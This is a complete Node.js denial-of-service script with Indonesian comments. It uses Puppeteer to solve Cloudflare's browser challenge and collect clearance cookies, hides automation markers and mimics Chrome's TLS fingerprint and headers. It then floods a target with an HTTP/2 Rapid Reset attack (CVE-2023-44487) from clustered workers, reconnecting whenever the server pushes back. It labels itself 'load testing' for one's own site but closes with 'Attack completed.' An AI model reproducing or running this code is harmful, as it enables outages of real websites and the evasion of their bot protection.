const { connect } = require("puppeteer-real-browser");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");

// ============================================================
// KONFIGURASI TLS FINGERPRINT (Menyerupai Chrome)
// ============================================================
const ciphers = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-RSA-AES128-SHA",
    "ECDHE-RSA-AES256-SHA",
    "AES128-GCM-SHA256",
    "AES256-GCM-SHA384",
    "AES128-SHA",
    "AES256-SHA"
].join(":");

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
].join(":");

const ecdhCurve = "X25519:P-256:P-384:P-521";

// ============================================================
// ARGS & ENTRY
// ============================================================
if (process.argv.length < 6) {
    console.log("\x1b[31mUsage: node xb.js <target> <time> <rate> <threads> <cookieCount>\x1b[0m");
    console.log("\x1b[33mExample: node xb.js https://example.com 60 5 4 6\x1b[0m");
    process.exit(1);
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    cookieCount: parseInt(process.argv[6]) || 2,
};

// ============================================================
// CLOUDFLARE BYPASS (Puppeteer)
// ============================================================
async function bypassCloudflareOnce(attemptNum = 1) {
    let browser = null;
    let page = null;

    try {
        console.log(`\x1b[33mBypass attempt ${attemptNum}...\x1b[0m`);

        const response = await connect({
            headless: false,
            args: [
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-dev-shm-usage",
                "--disable-accelerated-2d-canvas",
                "--no-first-run",
                "--no-zygote",
                "--disable-gpu",
                "--window-size=1920,1080",
            ],
            turnstile: true,
            connectOption: { defaultViewport: null },
        });

        browser = response.browser;
        page = response.page;

        await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, "webdriver", { get: () => undefined });
        });

        try {
            await page.goto(args.target, {
                waitUntil: "domcontentloaded",
                timeout: 60000,
            });
        } catch (navError) {
            console.log(`\x1b[33mNavigation warning: ${navError.message}\x1b[0m`);
        }

        let challengeCompleted = false;
        let checkCount = 0;
        const maxChecks = 120;

        while (!challengeCompleted && checkCount < maxChecks) {
            await new Promise((r) => setTimeout(r, 500));
            try {
                const cookies = await page.cookies();
                if (cookies.some((c) => c.name === "cf_clearance")) {
                    challengeCompleted = true;
                    break;
                }
                challengeCompleted = await page.evaluate(() => {
                    const title = (document.title || "").toLowerCase();
                    const body = (document.body?.innerText || "").toLowerCase();
                    if (
                        title.includes("just a moment") ||
                        title.includes("checking") ||
                        body.includes("checking your browser") ||
                        body.includes("cloudflare")
                    ) return false;
                    return document.body && document.body.children.length > 3;
                });
            } catch (_) {}
            checkCount++;
        }

        await new Promise((r) => setTimeout(r, 1000));
        const cookies = await page.cookies();
        const userAgent = await page.evaluate(() => navigator.userAgent);
        const cf = cookies.find((c) => c.name === "cf_clearance");

        console.log(`\x1b[36mCookies: ${cookies.length} | cf_clearance: ${cf ? "YES" : "NO"}\x1b[0m`);

        await page.close();
        await browser.close();

        return {
            cookies,
            userAgent,
            cfClearance: cf ? cf.value : null,
            success: cookies.length > 0,
            attemptNum,
        };
    } catch (error) {
        console.log(`\x1b[31mAttempt ${attemptNum} failed: ${error.message}\x1b[0m`);
        try { if (page) await page.close(); } catch (_) {}
        try { if (browser) await browser.close(); } catch (_) {}
        return {
            cookies: [],
            userAgent:
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            cfClearance: null,
            success: false,
            attemptNum,
        };
    }
}

async function bypassCloudflareParallel(totalCount) {
    console.log("\x1b[35mCLOUDFLARE BYPASS – PARALLEL\x1b[0m");
    const results = [];
    let attemptCount = 0;
    const batchSize = 2;

    while (results.length < totalCount) {
        const remaining = totalCount - results.length;
        const currentBatch = Math.min(batchSize, remaining);
        const batch = [];
        for (let i = 0; i < currentBatch; i++) {
            attemptCount++;
            batch.push(bypassCloudflareOnce(attemptCount));
        }
        const settled = await Promise.all(batch);
        for (const r of settled) {
            if (r.success) {
                results.push(r);
                console.log(`\x1b[32mSession ${r.attemptNum} OK (${results.length}/${totalCount})\x1b[0m`);
            }
        }
        if (results.length < totalCount) {
            await new Promise((r) => setTimeout(r, 2000));
        }
    }

    if (results.length === 0) {
        results.push({
            cookies: [],
            userAgent:
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            cfClearance: null,
            success: true,
        });
    }
    console.log(`\x1b[32mTotal sessions: ${results.length}\x1b[0m`);
    return results;
}

// ============================================================
// FLOODER – HTTP/2 Murni + Rapid Reset (CVE-2023-44487)
// ============================================================
function flood(userAgent, cookieString) {
    try {
        const parsed = url.parse(args.target);
        const path = parsed.path || "/";

        // Headers disusun sedemikian rupa menyerupai Chrome
        const headers = {
            ":method": "GET",
            ":authority": parsed.host,
            ":scheme": "https",
            ":path": path,
            "user-agent": userAgent,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "sec-ch-ua": `"Chromium";v="126", "Not)A;Brand";v="8", "Google Chrome";v="126"`,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "upgrade-insecure-requests": "1",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "cookie": cookieString,
            "priority": "u=0, i"
        };

        // Membuat TLS Socket dengan konfigurasi yang mendekati Chrome
        const socket = tls.connect({
            host: parsed.hostname,
            port: parsed.port || 443,
            servername: parsed.hostname,
            ALPNProtocols: ["h2"],
            ciphers: ciphers,
            sigalgs: sigalgs,
            ecdhCurve: ecdhCurve,
            rejectUnauthorized: false,
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3"
        });

        socket.setKeepAlive(true, 60000);
        socket.setNoDelay(true);

        const client = http2.connect(parsed.href, {
            createConnection: () => socket,
            settings: {
                headerTableSize: 65536,
                enablePush: false,
                initialWindowSize: 6291456,
                maxFrameSize: 16384,
                maxHeaderListSize: 262144
            }
        });

        client.on("connect", () => {
            let active = true;

            // Loop Rapid Reset
            const sendRapidReset = () => {
                if (!active || client.destroyed || client.closed) return;

                // Kirim sejumlah request sekaligus (burst)
                const burst = Math.max(1, args.rate);
                for (let i = 0; i < burst; i++) {
                    try {
                        // endStream: false berarti kita hanya mengirim HEADERS, belum menutup stream
                        const req = client.request(headers, { endStream: false });
                        
                        // Abaikan error pada stream
                        req.on('error', () => {});
                        
                        // Segera kirim RST_STREAM(CANCEL) untuk memicu Rapid Reset
                        req.close(http2.constants.NGHTTP2_CANCEL);
                        
                        // Tambah statistik SEGERA setelah frame dikirim
                        // Ini memastikan statistik tidak 0 req/s meskipun server membalas 403
                        global.totalRequests = (global.totalRequests || 0) + 1;
                        global.successRequests = (global.successRequests || 0) + 1;
                    } catch (err) {
                        global.failedRequests = (global.failedRequests || 0) + 1;
                    }
                }

                // Jeda antar burst (10ms - 20ms) agar event loop Node.js tidak freeze
                setTimeout(sendRapidReset, 10 + Math.random() * 10);
            };

            sendRapidReset();

            // Handle jika server mengirim GOAWAY (rate limit / proteksi)
            client.on("goaway", () => {
                active = false;
                try { client.destroy(); } catch (_) {}
                try { socket.destroy(); } catch (_) {}
                // Reconnect setelah jeda
                setTimeout(() => flood(userAgent, cookieString), 2000);
            });

            client.on("error", () => {
                active = false;
                try { client.destroy(); } catch (_) {}
                try { socket.destroy(); } catch (_) {}
                setTimeout(() => flood(userAgent, cookieString), 2000);
            });

            client.on("close", () => {
                active = false;
            });
        });

        client.on("error", () => {
            // Abaikan error level sesi
        });

    } catch (err) {
        // Abaikan error inisialisasi
    }
}

// ============================================================
// RUNNER & STATS
// ============================================================
function runFlooder() {
    if (!global.bypassData || global.bypassData.length === 0) return;
    const info = global.bypassData[Math.floor(Math.random() * global.bypassData.length)];
    const cookieString = info.cookies.map((c) => `${c.name}=${c.value}`).join("; ");
    flood(info.userAgent, cookieString);
}

function displayStats() {
    const elapsed = Math.floor((Date.now() - global.startTime) / 1000);
    const remaining = Math.max(0, args.time - elapsed);

    console.clear();
    console.log("\x1b[35mADVANCED LOAD TESTING (HTTP/2 RAPID RESET)\x1b[0m");
    console.log(`\x1b[36mTarget:\x1b[0m ${args.target}`);
    console.log(`\x1b[36mTime:\x1b[0m ${elapsed}s / ${args.time}s | Remaining: ${remaining}s`);
    console.log(`\x1b[36mRate:\x1b[0m ${args.rate} burst | Threads: ${args.threads}`);
    console.log(`\x1b[36mSessions:\x1b[0m ${global.bypassData.length} / ${args.cookieCount}`);
    console.log(`\x1b[32mFrames Sent (Total):\x1b[0m ${global.totalRequests || 0}`);
    console.log(`\x1b[31mFailed:\x1b[0m ${global.failedRequests || 0}`);
    console.log(
        `\x1b[33mSpeed:\x1b[0m ${elapsed > 0 ? ((global.totalRequests || 0) / elapsed).toFixed(2) : 0} req/s`
    );
}

// ============================================================
// MAIN EXECUTION
// ============================================================
global.totalRequests = 0;
global.successRequests = 0;
global.failedRequests = 0;
global.startTime = Date.now();
global.bypassData = [];

if (cluster.isMaster) {
    console.clear();
    console.log("\x1b[35mADVANCED LOAD TESTING\x1b[0m");
    console.log("\x1b[33mONLY USE FOR YOUR OWN WEBSITE!\x1b[0m\n");

    (async () => {
        const bypassResults = await bypassCloudflareParallel(args.cookieCount);
        global.bypassData = bypassResults;
        global.startTime = Date.now();

        for (let i = 0; i < args.threads; i++) {
            const worker = cluster.fork();
            worker.send({ type: "bypassData", data: bypassResults });
        }

        const statsInterval = setInterval(displayStats, 1000);

        cluster.on("message", (worker, message) => {
            if (message.type === "stats") {
                global.totalRequests += message.total || 0;
                global.successRequests += message.success || 0;
                global.failedRequests += message.failed || 0;
            }
        });

        cluster.on("exit", () => {
            if (Date.now() - global.startTime < args.time * 1000) {
                const w = cluster.fork();
                w.send({ type: "bypassData", data: bypassResults });
            }
        });

        setTimeout(() => {
            clearInterval(statsInterval);
            displayStats();
            console.log("\n\x1b[32mAttack completed.\x1b[0m");
            process.exit(0);
        }, args.time * 1000);
    })();
} else {
    let attackInterval;

    process.on("message", (msg) => {
        if (msg.type === "bypassData") {
            global.bypassData = msg.data;

            // Loop pemanggil koneksi flooder
            attackInterval = setInterval(() => {
                for (let i = 0; i < 5; i++) {
                    runFlooder();
                }
            }, 200);

            // Pengirim statistik ke Master Process
            setInterval(() => {
                process.send({
                    type: "stats",
                    total: global.totalRequests || 0,
                    success: global.successRequests || 0,
                    failed: global.failedRequests || 0,
                });
                global.totalRequests = 0;
                global.successRequests = 0;
                global.failedRequests = 0;
            }, 1000);
        }
    });

    setTimeout(() => {
        if (attackInterval) clearInterval(attackInterval);
        process.exit(0);
    }, args.time * 1000);
}

process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});